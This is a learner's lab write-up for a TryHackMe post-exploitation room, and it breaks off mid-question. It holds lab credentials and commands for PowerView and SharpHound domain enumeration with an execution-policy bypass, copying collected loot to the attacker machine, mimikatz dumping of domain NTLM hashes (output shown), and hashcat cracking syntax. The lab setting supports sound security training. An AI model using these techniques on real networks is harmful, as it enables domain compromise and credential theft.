# Try Hack me's Post-Exploitation Basics Notes

Target: `Windows Server v1.1`

Target ip: `10.10.35.17`

Attacker ip: `10.6.77.38`

RDP/SSH Username: `Administrator`

RDP/SSH Password: `P@$$W0rd`

RDP/SSH Domain Name:`CONTROLLER`





## Intro
**This room will cover**

-post-exploitation enumeration with powerview and bloodhound

-dumping hashes and golden ticket attacks with mimikatz

-basic information gathering using windows server tools and logs

-maintaining access with metasploit to get a meterpreter shell






## Enumeration w/ Powerview

*Starting this room requires RDP or SSHing into the maching.* **Powerview** is a powershell script from the powershell empire that can be used for enumerating a domain after you have already gained a shell in the system. It is already installed on this target machine. Can be found localy on kali's powersploit documentation and scripts
`/usr/share/window-resources/powersploit`

### Steps

1. Start Powershell, using -ep to bypass the execution policy of powershell, allowing scripts to run:

`powershell -ep bypass`

2. Start PowerView:

`. .\Downloads\PowerView.ps1`

3. Enumerate the domain users:

`Get-NetUser | select cn`

```powershell
PS C:\Users\Administrator>Get-NetUser | select cn
cn                  
--                          
Administrator               
Guest                       
krbtgt                      
Machine-1                   
Admin2                      
Machine-2                   
SQL Service                 
POST{P0W3RV13W_FTW}         
sshd 
```

4. Enumerate the domain groups:

`Get-NetGroup -GroupName *admin*`
```powershell
PS C:\Users\Administrator>Get-NetGroup -GroupName *admin*
Administrators
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins
```

5. Now enumerate the domain further on your own



Here's a cheatsheet to help you with commands: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

---

### Questions
1. What is the shared folder that is not set by default

*hint: Invoke-ShareFinder*

`Get-NetShare`

```powershell
PS C:\Users\Administrator> Get-NetShare      

shi1_netname  shi1_type shi1_remark         
------------  --------- -----------         
ADMIN$       2147483648 Remote Admin        
C$           2147483648 Default share       
IPC$         2147483651 Remote IPC          
NETLOGON              0 Logon server share  
Share                 0                     
SYSVOL                0 Logon server share 

```


*or from the hint*

`Invoke-ShareFinder`

```powershell
PS C:\Users\Administrator> Invoke-ShareFinder 
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin 
\\Domain-Controller.CONTROLLER.local\C$         - Default share 
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
```
a: Share

---

2. What operating system is running inside of the network besides Windows Server 2019 

*hint Get-NetComputer -fulldata | select operatingsystem*

```powershell
PS C:\Users\Administrator\Downloads> Get-NetComputer -fulldata | select operatingsystem

operatingsystem                  
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
```


a: Windows 10 Enterprise Evaluation

---

3. I've hidden a flag inside the users, find it. 

*to go with the previous naming system:*

`Get-NetUser | select name`

```powershell
PS C:\Users\Administrator\Downloads> Get-NetUser | select name

name                
----
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd
```
a: POST{P0W3RV13W_FTW}

---


## Enumeration w/ Bloodhound

Bloodhound is a GUI that lets one visually map a network. Sharphound, which is similar to PowerView take the user, groups, trusts etc. of the network,  collects them into a .json file to be used inside of Bloodhound.

SharpHound is alread on the target.

### To install Bloodhound on the attacking machine:

1. `apt-get install bloodhound`

2. `sudo neo4j console`

(delault credentials: neo4j/neo4j)

### Getting loot w/ SharpHound

1. *Same as PowerView*`powershell -ep bypass`

2. `. .\Downloads\SharpHound.ps1`

3. `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip`
```powershell
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Downloads>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Downloads> . .\SharpHound.ps1
PS C:\Users\Administrator\Downloads> Invoke-Bloodhound -CollectionMethod ALL -Domain CONTROLLER.local -ZipFileName l
oot.zip
------------------------------------------------ 
Initializing SharpHound at 11:22 AM on 7/29/2021 
------------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL    
PS C:\Users\Administrator\Downloads> [+] Cache File not Found: 0 Objects in cache 

[+] Pre-populating Domain Controller SIDS 
Status: 0 objects finished (+0) -- Using 71 MB RAM 
Status: 66 objects finished (+66 8)/s -- Using 80 MB RAM 
Enumeration finished in 00:00:00.6137046 
Compressing data to C:\Users\Administrator\Downloads\20210729112230_loot.zip
You can upload this file directly to the UI 

SharpHound Enumeration Completed at 11:22 AM on 7/29/2021! Happy Graphing! 
```
4. Transfer the loot.zip folder to the attacker machine 

*note since connecting via ssh, scp can be used to transfer the file*

```
scp -r  Administrator@10.10.35.17:C:/Users/Administrator/Downloads/20210731093702_loot.zip ~/CTF/THM/Post_Exploitation_Basics/loot.zip


Administrator@10.10.35.17's password: 
20210731093702_loot.zip             100% 9545   101.8KB/s   00:00    
                          
```

### Mapping out the Target network using Bloodhound

1. Run the command `bloodhound` on attacker maching

2. Sign in using the same credentials that had been set with Neo4j 

*had to reset my password via the neo4j interface on localhost*

3. Import the ***loot.zip*** folder into **bloodhound** by either draging and dropping or by clicking the **import** button.

*For my version I had to drag and drop, and the import feature gave an error about "corrupted JSON files"*

## Dumping hashes w/ mimikatz

**Mimikatz** is a very popular and power post-exploitation tool mainly used for dumping user credentials inside of an Active Directory network

This lab focuses on:
1. Dumping NTLM hashes with mimikatz
2. cracking those hashes using the offline hash cracking tool **hashcat**

### Dump Hashes with mimikatz
**note** *mimikatz.exe has already been placed in the target machine's Downloads folder*

1. `cd Downloads && mimikatz.exe` Will **c**hange **d**irectory to the downloads folder and then executes mimikatz.exe

```powershell
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>cd Downloads && 
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz #  
```

2. `privilege::debug` to ensure that the output is "Privilege '20' ok" meaning that mimikatz is running as an administrator

```
mimikatz # privilege::debug 
Privilege '20' OK 

mimikatz #
```

3. `lsadump::lsa /patch` to dump the hashes

```
mimikatz # lsadump::lsa /patch 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :  
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : 472c79ff822f8e57e100b97879c43aff

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a

mimikatz #
```

### Cracking Hashes with hashcat
Syntax:`hashcat -m 1000 <hash> rockyou.txt` hashcat to run hashcat, -m 1000 for mode type(NTLM) and rockyou.txt for the wordlist.

### Questions

1. What is **Machine1's** password?

`
